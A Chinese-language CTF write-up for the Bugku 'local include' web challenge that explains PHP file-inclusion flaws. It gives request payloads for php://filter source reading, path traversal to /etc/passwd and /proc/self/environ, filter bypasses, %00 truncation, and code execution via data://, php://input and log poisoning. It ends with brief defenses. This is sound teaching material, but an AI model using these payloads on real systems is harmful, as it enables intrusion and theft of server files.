---
title: Bugku 本地包含 - WEB
date: 2026-10-12 22:50:00
updated: 2026-10-12 22:50:00
description: Bugku 基础 30 题 第 24 题：Bugku 本地包含 - WEB
cover: 
top_img: 
tags:
  - Bugku
  - WEB
  - 基础30题
categories:
  - WriteUp
keywords: Bugku,CTF,WriteUp,WEB
---

## 1. 题目信息
- 平台：Bugku CTF
- 分类：WEB
- 难度：★★☆☆☆
- 题目地址：https://ctf.bugku.com/challenges/detail/id/87.html
- 附件：无（或给了源码）

## 2. 题目描述
页面给了源码，类似：

```php
<?php
include $_GET['file'];
?>
```

或者更绕一点：
```php
<?php
$file = $_GET['file'];
if (strstr($file, "flag")) { die("no!"); }
include $file;
?>
```

提示：**本地包含（LFI）**。

## 3. 解题思路（一句话）
`include` 直接拼接用户输入 → 用 **PHP 伪协议**（`php://filter`）读取源码，
或者用 **data://** 执行任意代码。

## 4. 详细步骤

### 4.1 什么是文件包含漏洞
```php
include $_GET['file'];      // 用户给什么就包含什么
```
`include` 会把**指定文件的内容当作 PHP 代码执行**。
如果这个文件名用户可控，就能：
- 读服务器上的任意文件（`/etc/passwd`、源码）
- 在特定条件下执行任意代码

### 4.2 第一步：先看源码（用 php://filter）
**`php://filter` 可以把文件内容做 Base64 编码输出**，这样 PHP 就不会把它当代码执行，而是直接打印出来。

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

> **为什么要 Base64？**
> 如果直接 `?file=index.php`，PHP 会把 index.php 当代码执行，你只能看到**执行结果**（也就是原页面）。
> 加上 filter 后，PHP 输出的是**文件内容的 Base64**，你解码就拿到源码了。

**解码：**
```bash
# Linux / Git Bash
echo "PD9waHAg..." | base64 -d

# Python（跨平台）
python -c "import base64;print(base64.b64decode('PD9waHAg...').decode())"
```

**常用目标文件：**
```
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=../flag.php
```

### 4.3 第二步：读系统文件
```
?file=/etc/passwd
?file=../../../../etc/passwd
?file=../../../../etc/hosts
?file=../../../../proc/self/environ
```
如果能读到 `/etc/passwd`，说明**包含漏洞确实存在**（Linux 靶机）。

### 4.4 第三步：绕过过滤

**① 绕过 `strstr($file,"flag")` 这类关键词检测**
- **大小写**：`FLAG.php`（Linux 区分大小写，可能不行；Windows 可以）
- **双写**：`flflagag.php`（如果过滤只做一次替换）
- **目录穿越 + 通配**：`/var/www/html/fla?.php`
- **伪协议绕过**：`php://filter/...resource=flag.php`（检测的是整个字符串）

**② 绕过 `../` 被过滤**
- `....//` → 过滤掉 `../` 后剩下 `../`
- `..%2f`、`%2e%2e%2f`（URL 编码）
- `..\`（Windows 路径分隔符）

**③ 绕过后缀拼接（如 `include $file . ".php"`）**
用 `%00` 截断（**PHP < 5.3.4，且 magic_quotes_gpc 关闭**）：
```
?file=/etc/passwd%00
```
或者用 `php://filter` 的长伪协议把后缀"吃掉"。

### 4.5 第四步：执行代码（进阶）
如果 `allow_url_include = On`，可以用 `data://`：

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+
```
上面这串 Base64 解出来是 `<?php system("ls");?>`。

或者用 **日志包含**：
```
?file=/var/log/apache2/access.log
```
先往日志里写 PHP 代码（改 User-Agent），再包含日志文件执行。

### 4.6 针对本题（flag.php 直接包含）
很多情况下最简单的做法就是：
```
?file=flag.php
```
直接包含 flag.php —— 如果 flag.php 里有 `echo $flag;`，**执行它就会打印 flag**。

> **关键思路**：`include` 是**执行**，不是"读取"。
> 所以如果 flag 在某个 PHP 文件的**输出**里，直接 include 它就赢了。
> 如果 flag 在**变量/注释**里（不输出），才需要用 `php://filter` 读源码。

### 4.7 用 Burp / curl 发包
```bash
curl -s "题目地址?file=php://filter/read=convert.base64-encode/resource=index.php"
```

## 5. 关键知识点
- **文件包含漏洞（LFI/RFI）**：`include` / `require` 的文件名用户可控。
  - **LFI（Local File Inclusion）**：包含本机文件
  - **RFI（Remote File Inclusion）**：包含远程文件（需 `allow_url_include=On`）
- **PHP 伪协议**：
  | 协议 | 作用 | 示例 |
  |---|---|---|
  | `php://filter` | 读文件源码（Base64 输出） | `php://filter/read=convert.base64-encode/resource=index.php` |
  | `php://input` | 读 POST body（可执行代码） | `?file=php://input` + POST `<?php system('ls');?>` |
  | `data://` | 直接提供内容（可执行） | `?file=data://text/plain;base64,xxxx` |
  | `file://` | 读本地文件 | `?file=file:///etc/passwd` |
  | `phar://` | 触发反序列化 | `?file=phar://upload.jpg/x` |
- **防御方法**：白名单校验文件名、`open_basedir` 限制、关闭 `allow_url_include`。

## 6. 常见坑
- **`php://filter` 忘了 `resource=`**：必须写成
  `php://filter/read=convert.base64-encode/resource=xxx.php`
- **Base64 解出来还是乱码**：可能用了 `convert.iconv` 链，或者文件本身是二进制。
- **包含不存在的文件**：会报 Warning 但在页面上可能不显示，先打开 `display_errors` 或者看响应内容。
- **Windows 靶机**：路径用 `C:\Windows\win.ini` 或 `../../../../boot.ini`。
- ⚠️ **`%00` 截断在 PHP 5.3.4+ 已经修复**，现代靶机基本不能用。

## 7. FLAG
```
flag{这里填你提交成功的真实 flag}
```

